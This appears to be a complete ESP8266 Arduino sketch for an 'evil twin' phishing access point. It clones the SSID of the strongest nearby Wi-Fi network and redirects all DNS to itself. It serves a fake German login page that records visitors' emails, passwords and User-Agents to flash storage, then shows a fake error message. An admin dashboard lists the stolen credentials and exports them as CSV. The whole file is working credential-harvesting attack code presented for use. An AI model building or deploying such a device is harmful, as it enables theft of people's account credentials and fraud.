#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>

const char *web_password = "***"; //CHANGE ME
const unsigned long SCAN_INTERVAL = 600000;

String currentSSID = "Free_WiFi";
unsigned long lastScanTime = 0;

const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer server(80);

const char *headerkeys[] = {"User-Agent"};
size_t headerkeyssize = sizeof(headerkeys) / sizeof(char*);

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Anmeldung</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #1c1c1e; }
  .card { background: white; padding: 2rem; border-radius: 14px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 90%; max-width: 360px; text-align: center; }
  h2 { font-size: 1.4rem; margin-bottom: 0.5rem; font-weight: 600; }
  p { color: #8e8e93; font-size: 0.95rem; margin-bottom: 1.5rem; line-height: 1.4; }
  .ssid-name { color: #007AFF; font-weight: 700; word-break: break-all; }
  input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #d1d1d6; border-radius: 10px; font-size: 16px; box-sizing: border-box; background: #f9f9f9; transition: 0.2s; }
  input:focus { border-color: #007AFF; outline: none; background: #fff; }
  button { width: 100%; padding: 14px; background-color: #007AFF; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 5px; }
  button:hover { background-color: #0056b3; }
  .footer { margin-top: 20px; font-size: 0.8rem; color: #c7c7cc; }
</style>
</head>
<body>
  <div class="card">
    <h2>WLAN Anmeldung</h2>
    <p>Für den Zugang zu <span class="ssid-name">%SSID%</span> ist ein Konto erforderlich.</p>
    <form action="/dashboard" method="POST">
      <input type="text" name="email" placeholder="Identität / E-Mail" required>
      <input type="password" name="password" placeholder="Passwort" required>
      <button type="submit">Verbinden</button>
    </form>
    <div class="footer">Sichere Verbindung</div>
  </div>
</body>
</html>
)rawliteral";

void saveLog(String data) {
  File file = LittleFS.open("/logs.txt", "a");
  if (file) {
    file.println(data);
    file.close();
    Serial.println("Log gespeichert: " + data);
  } else {
    Serial.println("Fehler beim Speichern!");
  }
}

void clearLogs() {
  File file = LittleFS.open("/logs.txt", "w");
  if (file) {
    file.close();
    Serial.println("Logs gelöscht.");
  }
}

String readLogsHTML() {
  if (!LittleFS.exists("/logs.txt")) return "<tr><td>Keine Logs vorhanden.</td></tr>";
  
  File file = LittleFS.open("/logs.txt", "r");
  if (!file) return "<tr><td>Fehler beim Lesen.</td></tr>";

  String htmlRows = "";
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.length() > 0) {
      line.replace(";", " <b style='color:#007AFF'>|</b> ");
      htmlRows += "<tr><td>" + line + "</td></tr>";
    }
  }
  file.close();
  return htmlRows;
}

void scanAndSetSSID() {
  Serial.println("Starte Netzwerk-Scan...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  int n = WiFi.scanNetworks();
  String strongestSSID = "";
  int bestRSSI = -100;

  if (n > 0) {
    for (int i = 0; i < n; ++i) {
      if (WiFi.SSID(i).length() > 0 && WiFi.RSSI(i) > bestRSSI) {
        bestRSSI = WiFi.RSSI(i);
        strongestSSID = WiFi.SSID(i);
      }
    }
  } else {
    Serial.println("Keine Netzwerke gefunden.");
  }

  if (strongestSSID != "") {
    currentSSID = strongestSSID;
    Serial.println("Neues Ziel-Netzwerk: " + currentSSID);
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP(currentSSID.c_str());
  
  dnsServer.stop();
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
}

void handleRoot() {
  String html = index_html;
  html.replace("%SSID%", currentSSID); 
  server.send(200, "text/html", html);
}

void handleClear() {
  if (!server.hasArg("auth") || server.arg("auth") != web_password) {
    server.send(403, "text/plain", "Verboten");
    return;
  }
  clearLogs();
  server.sendHeader("Location", "/dashboard?auth=" + String(web_password));
  server.send(302, "text/plain", "");
}

void handleDashboard() {
  String emailInput = server.arg("email");
  String passwordInput = "";
  
  if (server.hasArg("password")) passwordInput = server.arg("password");
  else if (server.hasArg("auth")) passwordInput = server.arg("auth");

  if (passwordInput == web_password) {
    String html = "<!DOCTYPE HTML><html><head><title>Admin</title>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
    html += "<style>body{font-family: monospace; padding:10px; background:#333; color:#fff;} h3{border-bottom:1px solid #555; padding-bottom:5px;} table{width:100%; border-collapse: collapse; background:#444; border-radius:5px;} td {border-bottom: 1px solid #555; padding: 8px; font-size: 11px; word-break: break-all;} .btn {background: #28a745; color: white; padding: 10px; text-decoration: none; display:block; text-align:center; margin-top:10px; border-radius:4px; font-weight:bold;} .btn-del {background: #dc3545;}</style></head><body>";
    
    html += "<h3>STATUS: " + currentSSID + "</h3>";
    html += "<p>Clients: " + String(WiFi.softAPgetStationNum()) + "</p>";
    
    html += "<a href='/csv?auth=" + String(web_password) + "' class='btn'>Download .CSV</a>";
    html += "<a href='/clear?auth=" + String(web_password) + "' class='btn btn-del' onclick=\"return confirm('Wirklich alles loeschen?')\">Logs loeschen</a>";
    
    html += "<h3 style='margin-top:20px'>GESPEICHERTE DATEN</h3>";
    html += "<table>" + readLogsHTML() + "</table>";
    
    html += "</body></html>";
    server.send(200, "text/html", html);
  } 
  else {
    if (passwordInput.length() > 0 || emailInput.length() > 0) {
      String userAgent = server.header("User-Agent");
      userAgent.replace(";", ","); 
      
      String logData = emailInput + ";" + passwordInput + ";" + userAgent + ";" + currentSSID;
      saveLog(logData);
    }
    server.send(200, "text/html", "<script>alert('Verbindung fehlgeschlagen. Bitte versuchen Sie es erneut.'); window.location.href='/';</script>");
  }
}

void handleCSV() {
  if (!server.hasArg("auth") || server.arg("auth") != web_password) return;

  File file = LittleFS.open("/logs.txt", "r");
  if (!file) {
    server.send(200, "text/plain", "Keine Daten");
    return;
  }
  
  String output = "Email;Passwort;UserAgent;TargetSSID\n";
  while (file.available()) {
    output += (char)file.read();
  }
  file.close();

  server.sendHeader("Content-Disposition", "attachment; filename=\"logs.csv\"");
  server.send(200, "text/csv", output);
}

void handleNotFound() {
  server.sendHeader("Location", String("http://") + server.client().localIP().toString());
  server.send(302, "text/plain", "");
}

void setup() {
  delay(1000);
  Serial.begin(115200);

  if(!LittleFS.begin()){
    Serial.println("LittleFS Mount Failed - formatiere...");
    LittleFS.format();
    LittleFS.begin();
  }

  scanAndSetSSID();

  server.collectHeaders(headerkeys, headerkeyssize);

  server.on("/", handleRoot);
  server.on("/dashboard", HTTP_ANY, handleDashboard);
  server.on("/csv", handleCSV);
  server.on("/clear", handleClear);
  
  server.on("/generate_204", handleRoot);
  server.on("/fwlink", handleRoot);
  server.onNotFound(handleNotFound);

  server.begin();
}

void loop() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastScanTime >= SCAN_INTERVAL) {
    lastScanTime = currentMillis;
    scanAndSetSSID();
  }

  dnsServer.processNextRequest();
  server.handleClient();
}
